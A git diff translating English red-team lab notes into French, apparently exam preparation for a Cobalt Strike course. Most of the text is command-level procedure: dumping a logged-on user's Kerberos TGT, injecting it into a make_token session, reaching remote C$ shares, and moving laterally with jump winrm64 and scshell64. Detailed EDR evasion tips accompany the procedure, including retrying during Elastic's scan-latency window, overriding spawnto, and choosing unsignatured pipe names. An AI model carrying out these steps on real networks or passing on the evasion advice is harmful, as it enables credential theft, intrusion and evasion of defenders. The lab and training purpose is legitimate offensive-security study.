@@ -1,30 +1,30 @@
-# User Impersonation Lab
+# Lab — User Impersonation
 
-> **Objective:** Dump a user's TGT from their active logon session and impersonate it to access remote resources as that user without knowing their password.
+> **Objectif :** récupérer le TGT d’un utilisateur depuis sa session de logon active et effectuer une impersonation pour accéder à ses ressources distantes sans connaître son mot de passe.
 
-## When Impersonation  
+## Quand utiliser l’impersonation  
 
->Have a SYSTEM beacon from Privilege Escalation  
->Then Dump TGT → impersonate user → access remote resources
+> Disposer d’un Beacon SYSTEM après Privilege Escalation  
+> Puis récupérer le TGT → impersonation → accès distant
 >Lateral Movement  
 >Domain Dominance  
 
-## Prerequisite
+## Prérequis
 
-⚠️ Load Kerbeus-BOF aggressor script if not already loaded💡:
+⚠️ Charger le script Aggressor Kerbeus-BOF s’il ne l’est pas déjà :
 ```
 CS → Cobalt Strike → Script Manager → Load → C:\Tools\Kerbeus-BOF\kerbeus_cs.cna
 ```
 
-## Verify access denied 
+## Vérifier le refus d’accès 
 
 ```cs
 beacon> ls \\lon-ws-1\c$
 ```
 
-## Local Enumeration    
+## Énumération locale    
 
-From the SYSTEM beacon, look for processes running as the other user:
+Depuis le Beacon SYSTEM, rechercher les processus exécutés sous l’identité de l’autre utilisateur :
 
 ```cs
 ps
@@ -35,126 +35,122 @@ ps
 krb_triage
 ```
 
-Look for user: `rsteel @ CONTOSO.COM | krbtgt/CONTOSO.COM`  
+Rechercher l’utilisateur : `rsteel @ CONTOSO.COM | krbtgt/CONTOSO.COM`  
 
-| LUID | Account | Notes |
+| LUID | Compte | Remarques |
 |------|---------|-------|
-| `0x3e7` | `lon-wkstn-1$` | SYSTEM logon session — machine account TGT |
-| `0x3e4` | `lon-wkstn-1$` | Network service logon session |
-| Any other | Domain user | Interactive or network logon — user TGT |
+| `0x3e7` | `lon-wkstn-1$` | Session SYSTEM — TGT du compte machine |
+| `0x3e4` | `lon-wkstn-1$` | Session Network Service |
+| Autre | Utilisateur du domaine | Logon interactif ou réseau — TGT utilisateur |
 
-## Dump User  
+## Récupérer le TGT utilisateur  
 
 ```cs
 krb_dump /user:rsteel /service:krbtgt
 ```
 
 **OPSEC:** `OPSEC-🟠CAUTION`
-- Kerbeus-BOF reads from LSASS via Kerberos API — no raw `ReadProcessMemory` on LSASS
-- Less detectable than Mimikatz `sekurlsa::tickets` but still touches LSASS indirectly
-- Event 4769 (Kerberos service ticket request) may fire on the DC — not directly from this command
-- Elastic EDR and Sysmon will log the BOF execution (via the beacon process)
+- Kerbeus-BOF utilise l’API Kerberos pour accéder aux tickets, sans `ReadProcessMemory` direct sur LSASS.
+- Les notes indiquent une détection différente de Mimikatz `sekurlsa::tickets`, avec un accès indirect à LSASS.
+- L’Event 4769 peut apparaître sur le DC lors d’une demande de service ticket, mais pas directement à cause de cette commande.
+- Elastic EDR et Sysmon peuvent journaliser l’exécution du BOF via le processus Beacon.
 
-Copy the base64 kirbi from the output.
+Copier la valeur Base64 du ticket `.kirbi` depuis la sortie.
 
-## Save kirbi to attacker desktop
+## Enregistrer le `.kirbi` sur l’Attacker Desktop
 
->Copy base64 value and paste to PowerShell command on attacker desktop PowerShell:
+> Utiliser la valeur Base64 obtenue dans la commande PowerShell de l’Attacker Desktop :
 
 ```powershell
 [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("<paste-base64-here>"))
 ```
 
-## Create sacrificial logon session  
+## Créer une session de logon temporaire  
 
 ```cs
 make_token CONTOSO\rsteel FakePass
 ```
 
 **OPSEC:** `OPSEC-🟠CAUTION`
-- Creates a Type 9 (NewCredentials) logon session — **Event 4648 logged**
-- The password is fake — it is never validated by the DC
-- The logon session is local only — used as a container to hold the injected Kerberos ticket
-- Event 4648 shows `CONTOSO\rsteel` logged on from this machine — visible to SIEM
+- Crée une session de logon de type 9 (NewCredentials) ; **Event 4648** enregistré selon les notes.
+- Le mot de passe est fictif, sans validation par le DC.
+- La session de logon est locale et sert à accueillir le ticket Kerberos injecté.
+- L’Event 4648 peut associer `CONTOSO\rsteel` à la machine et être visible dans le SIEM.
 
-**Why FakePass works:**
-`make_token` with `/netonly` semantics creates a logon session without validating credentials
-locally. The ticket you inject next provides the actual Kerberos authentication — the password
-field is irrelevant for ticket-based auth.
+**Pourquoi FakePass fonctionne :**
+`make_token` avec la sémantique `/netonly` crée une session de logon sans valider les credentials localement. Le ticket injecté fournit l’authentification Kerberos, indépendamment du champ mot de passe.
 
-## Inject TGT kirbi file in logon session  
+## Injecter le TGT `.kirbi` dans la session  
 
 ```cs
 kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
 ```
 
 **OPSEC:** `OPSEC-🟠CAUTION`
-- Calls `LsaCallAuthenticationPackage` with `KerbSubmitTicketMessage` — injects ticket into
-  the logon session created by `make_token`
-- Not directly signatured, but Elastic EDR hooks LSASS API calls — visible in telemetry
+- Utilise `LsaCallAuthenticationPackage` avec `KerbSubmitTicketMessage` pour injecter le ticket dans la session créée par `make_token`.
+- Elastic EDR peut observer les appels aux API LSASS dans sa télémétrie.
 
-## Verify ticket is loaded
+## Vérifier le chargement du ticket
 
->Use `powerpick` instead to avoid the child process: OPSEC-🟠CAUTION 
+> Utiliser `powerpick` pour éviter le child process mentionné : OPSEC-🟠CAUTION. 
 ```cs
 powerpick klist
 ```
-## Access remote resource
+## Accéder aux ressources distantes
 
 ```cs
 ls \\lon-ws-1\c$
 ls \\lon-dc-1\c$
 ```
 
-### Step 8 — Drop impersonation
+### Terminer l’impersonation
 
 ```cs
 beacon> rev2self
 ```
 
-**Always run `rev2self` after completing the task** — leaves the logon session open but stops
-using the stolen token. The logon session is purged when the beacon exits.
+**Exécuter `rev2self` à la fin** : la session de logon reste ouverte, mais le token récupéré n’est plus utilisé. La session est purgée à la fermeture du Beacon.
 
 ---
 
-## OPSEC — steal_token vs make_token Comparison
+## OPSEC — Comparaison steal_token / make_token
 
 | | `steal_token` | `make_token` + `kerberos_ticket_use` |
 |--|---|---|
-| Tier | 🟢SAFE | 🟠CAUTION |
-| Logon event | None | Event 4648 on local host |
-| LSASS touch | None | Kerberos API via LSASS |
-| Requires | Target process running | TGT from `krb_dump` |
-| Works after user logs off | No | Yes (while kirbi is valid) |
-| Exam preference | **Always try first** | Fallback |
+| Niveau | 🟢SAFE | 🟠CAUTION |
+| Event logon | Aucun | Event 4648 sur l’hôte local |
+| Accès à LSASS | Aucun | API Kerberos via LSASS |
+| Prérequis | Processus cible actif | TGT obtenu par `krb_dump` |
+| Après la déconnexion utilisateur | Non | Oui, tant que le `.kirbi` reste valide |
+| Priorité à l’examen | **À essayer d’abord** | Alternative |
 
 ----
 
-# Plaintext Passwords Not Required
+# Aucun mot de passe en clair nécessaire
 
-Token/ticket impersonation bypasses the need to crack hashes entirely. Know Kerberoasting as a technique for exam scoring, but do not depend on cracking being in the critical path.
+L’impersonation par token/ticket évite le cracking de hashes dans ce scénario. Kerberoasting reste une technique à connaître, mais le cracking n’est pas forcément indispensable.
 
-| Goal | Technique | Needs plaintext? |
+| Objectif | Technique | Mot de passe en clair requis ? |
 |------|-----------|-----------------|
-| Lateral movement | `steal_token` + `jump winrm64` | No |
-| Lateral movement | `make_token` + `kerberos_ticket_use` + `jump winrm64` | No — fake pass works |
-| NTLM-based lateral | `pth` | NTLM hash only — no plaintext |
-| Domain recon | `ldapsearch` BOF | No |
-| Access remote share | stolen TGT + `kerberos_ticket_use` | No |
+| Lateral Movement | `steal_token` + `jump winrm64` | No |
+| Lateral Movement | `make_token` + `kerberos_ticket_use` + `jump winrm64` | No — fake pass works |
+| Lateral Movement NTLM | `pth` | NTLM hash only — no plaintext |
+| Reconnaissance domaine | `ldapsearch` BOF | No |
+| Accès au partage distant | stolen TGT + `kerberos_ticket_use` | No |
 
-**When plaintext is actually required:**
-- RDP with password authentication (rare in exam)
-- Credential spraying if no tickets available
+**Cas où un mot de passe en clair est nécessaire :**
+- RDP avec authentification par mot de passe (rare dans ce lab).
+- Credential spraying si aucun ticket n’est disponible.
 
-**Exam path:** `steal_token` → `jump winrm64` → new beacon as impersonated user. Token/ticket impersonation is always faster and stealthier than waiting on hashcat.
+**Workflow d’examen :** `steal_token` → `jump winrm64` → new beacon as impersonated user. Token/ticket impersonation is always faster and stealthier than waiting on hashcat.
 
 ---
 
-## Lateral Movement — All Jump Methods (Post-Impersonation Exam Reference)
+## Lateral Movement — Jump après impersonation
 
-> Run these **after** `steal_token` or `make_token` + `kerberos_ticket_use`. Work top-to-bottom — stop at the first method that gives you a live beacon. Each method has a different detection profile; know when to fall down.
+> Ces méthodes s’utilisent **après** `steal_token` ou `make_token` + `kerberos_ticket_use`. Chaque technique possède son propre profil de détection.
 
-### Pre-flight — Always set spawnto before jumping
+### Préparation — Configurer spawnto avant le Jump
 
 ```cs
 // For WinRM / inject-based jumps (fork & run into remote process)
@@ -164,29 +160,29 @@ beacon> spawnto x64 %windir%\sysnative\werfault.exe
 beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
 ```
 
-> Default spawnto is `rundll32.exe` — signatured by every major EDR. Always override before any `jump` command.
+> Le `spawnto` par défaut est `rundll32.exe`, souvent surveillé par les EDR. Les notes recommandent de le configurer avant un Jump.
 
 ---
 
-### Jump to host
+### Jump vers un hôte
 
->Use winrm64 if enabled on target  
+> Utiliser `winrm64` si WinRM est actif sur la cible.  
 
 ```cs
 beacon> powerpick Test-WSMan lon-ws-1       // test reachability — OPSEC-🟢SAFE, no child proc
 beacon> jump winrm64 lon-ws-1 smb
 ```
 
-| Property | Detail |
+| Propriété | Détail |
 |----------|--------|
-| Mechanism | WinRM executes shellcode, injects into `wsmprovhost.exe` |
-| Service created | No |
+| Mécanisme | WinRM executes shellcode, injects into `wsmprovhost.exe` |
+| Service créé | Non |
 | Event 7045 | No |
 | Event 4648 | No (if steal_token used) |
-| Disk write | No |
-| Child process on source | No |
+| Écriture disque | Non |
+| Child process sur la source | Non |
 
-**EDR caveat + retry behaviour (lab-confirmed 2026-04-19):**
+**Observations EDR (lab du 19/04/2026) :**
 `jump winrm64` generates the SMB beacon payload on-the-fly. Elastic Endpoint may kill it on first attempt (`ERROR_FILE_NOT_FOUND`). **Always retry once before falling down** — Elastic has a scan latency window and the second attempt often succeeds within 10–15 seconds of the first.
 
 ```
@@ -199,9 +195,9 @@ Only fall to Method `scshell64` if two consecutive attempts both return `ERROR_F
 
 ---
 
-### Method scshell64  
+### Méthode scshell64  
 
-**Use when WinRM is disabled or payload gets caught. Modifies an existing service — no new service created.**
+**Utilisé lorsque WinRM est désactivé ou que le payload est bloqué :** modifie un service existant, sans en créer de nouveau.
 
 ```cs
 // Load CNA first if not already loaded:
@@ -212,53 +208,53 @@ beacon> jump scshell64 <target> <listener>
 beacon> rev2self
 ```
 
-| Property | Detail |
+| Propriété | Détail |
 |----------|--------|
-| Mechanism | Modifies existing service `ImagePath` via SCM RPC — runs payload as SYSTEM |
+| Mécanisme | Modifies existing service `ImagePath` via SCM RPC — runs payload as SYSTEM |
 | Service created | No (modifies existing) |
 | Event 7045 | No |
 | Event 7040 | **Yes** — service config changed |
-| Disk write | No |
-| Requires | Local admin on target |
+| Écriture disque | Non |
+| Prérequis | Administrateur local sur la cible |
 
 > SCShell restores the original service path after execution — Event 7040 fires twice (change + restore). Less noisy than psexec but still visible to a tuned SIEM.
 
 ---
 
 
-### Lab-Observed: Elastic Endpoint Behaviour (2026-04-19)
+### Comportement observé d’Elastic Endpoint (19/04/2026)
 
 **All hosts confirmed running:** `elastic-agent.exe`, `elastic-endpoint.exe`, `MsMpEng.exe`, `Sysmon64.exe`
 
-**winrm64 findings — Unconstrained Delegation lab:**
+**Résultats winrm64 — Lab Unconstrained Delegation :**
 - Source beacon died after `jump winrm64` — Elastic had already tracked/flagged the beacon process in that lab instance
 - Likely cause: beacon was already an active detection target before the jump — fresh lab instances behave differently
 - Not a reliable indicator of winrm64 capability — environment state matters
 
-**winrm64 findings — Constrained Delegation lab (fresh instance):**
+**Résultats winrm64 — Lab Constrained Delegation (instance neuve) :**
 - Attempt 1 with `smb` (TSVCPIPE-*) → `ERROR_FILE_NOT_FOUND` — Elastic kills beacon on lon-fs-1 before pipe created
 - Attempt 2 (13s later) with `smb` → `[+] established link` — **succeeded** via scan latency gap
 - `smb_custom` (mojo pipe) → `[+] established link` **first attempt** — may be pipe name effect, may be fresh Elastic state
 - Conclusion: **retry winrm64 once before falling to scshell64** — timing/environment state is a factor
 
-**scshell64 findings:**
+**Résultats scshell64 :**
 - `ak-settings spawnto_x64 C:\Windows\System32\svchost.exe` required first
 - Payload binary (`evil59.exe`) written to `\\target\C$\Windows\System32\` — transient, auto-deleted
 - `defragsvc` service path modified (Event 7040 × 2) — restored after execution
 - Beacon established **first attempt in both lab instances** — most reliable delivery method observed
 - OPSEC cost: Event 7040 × 2, brief disk write to System32
 
-**Auth method conclusion:** `steal_token` required for WinRM auth — uses real Kerberos TGT from the target process token. `make_token` without `kerberos_ticket_use` = `ERROR_LOGON_FAILURE` — WinRM rejects fake credentials. Never use `make_token` alone for WinRM lateral movement.
+**Conclusion sur la méthode d’authentification :** `steal_token` required for WinRM auth — uses real Kerberos TGT from the target process token. `make_token` without `kerberos_ticket_use` = `ERROR_LOGON_FAILURE` — WinRM rejects fake credentials. Never use `make_token` alone for WinRM lateral movement.
 
-**Pipe name conclusion:** Pipe name is NOT the primary Elastic detection vector — payload content in memory is. However, custom pipe names are still required for exam OPSEC score (examiner reviews artifacts) and to avoid MDI/threat hunting detections on `TSVCPIPE-*`. See pipe name guidance below.
+**Conclusion sur les named pipes :** Pipe name is NOT the primary Elastic detection vector — payload content in memory is. However, custom pipe names are still required for exam OPSEC score (examiner reviews artifacts) and to avoid MDI/threat hunting detections on `TSVCPIPE-*`. See pipe name guidance below.
 
 ---
 
-### SMB Listener Pipe Name — Exam Day
+### Named Pipes SMB Listener — Examen
 
 **Do NOT use `mojo.5688.8052.183894939787088877`** — this specific value has been documented in threat intelligence reports since 2019 (FalconForce, Red Canary, Elastic detection rules). It is as signatured as `TSVCPIPE-*` in modern detection tooling.
 
-**Do NOT use any of these — all documented CS IOCs:**
+**Éviter ces noms : ce sont des IOCs Cobalt Strike documentés :**
 ```
 TSVCPIPE-*       ← CS default
 mojo.*           ← documented evasion technique since 2019
